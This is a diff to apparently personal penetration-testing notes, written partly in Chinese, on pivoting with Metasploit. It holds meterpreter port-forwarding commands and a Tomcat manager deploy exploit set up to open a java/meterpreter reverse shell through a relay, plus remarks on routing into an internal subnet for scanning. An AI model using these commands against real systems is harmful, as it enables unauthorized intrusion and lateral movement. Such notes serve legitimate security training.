@@ -17,7 +17,8 @@ meterpreter > portfwd  -h
 meterpreter > portfwd add -l 4447 -r 172.20.134.137 -p 4447
 [*] Local TCP relay created: 0.0.0.0:4447 <-> 172.20.134.137:4447
 meterpreter > portfwd
-0: 0.0.0.0:4447 -> 172.20.134.137:4447msf exploit(tomcat_mgr_deploy) > set LHOST 172.20.134.137
+0: 0.0.0.0:4447 -> 172.20.134.137:4447
+msf exploit(tomcat_mgr_deploy) > set LHOST 172.20.134.137
 LHOST => 172.20.134.137
 msf exploit(tomcat_mgr_deploy) > set LPORT 4447
 LPORT => 4447
@@ -47,7 +48,7 @@ msf exploit(tomcat_mgr_deploy) > exploit
 所以实际中记得先添加防火墙放行规则（具体见qyh.py svs）
 
 在这个例子中，通过映射端口来转发，等拿到192.168.2.125的meterpreter后，再route add 添加192.168.2.0/24到路由上进行扫描或其他活动
-在开始的时候直接使用route add 来添加路由，好像没办法使用漏洞 exploit/multi/http/tomcat_mgr_deploy 或者它的payload java/meterpreter/reverse_tcp
+在开始的时候直接使用route add 来添加172.20.134.137路由，好像没办法对192.168.2.125使用漏洞 exploit/multi/http/tomcat_mgr_deploy 或者它的payload java/meterpreter/reverse_tcp
 [portfwd&pivot] -- end
 
 
